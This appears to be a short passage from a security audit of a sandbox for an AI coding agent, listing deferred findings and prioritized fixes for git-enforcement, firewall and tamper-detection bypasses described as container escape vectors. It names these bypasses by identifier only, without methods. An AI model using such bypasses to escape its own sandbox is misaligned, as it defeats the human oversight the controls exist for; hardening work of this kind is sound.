- Original H5 (chmod 700 staging) — can't chmod bind-mount source
- Original H10 (API exfil) — inherent to Claude Code operation
- L6 (nosuid/nodev) — redundant with no-new-privileges

**Root-cause fixes prioritized:**
- Git enforcement bypasses (C1, C2, H3, H4) — complete defeats
- Firewall bypasses (H1, H2) — complete defeats
- Tamper detection bypasses (H6, H8, H9) — container escape vectors
- Design flaws (DF1, DF2) — require architectural changes, not patches
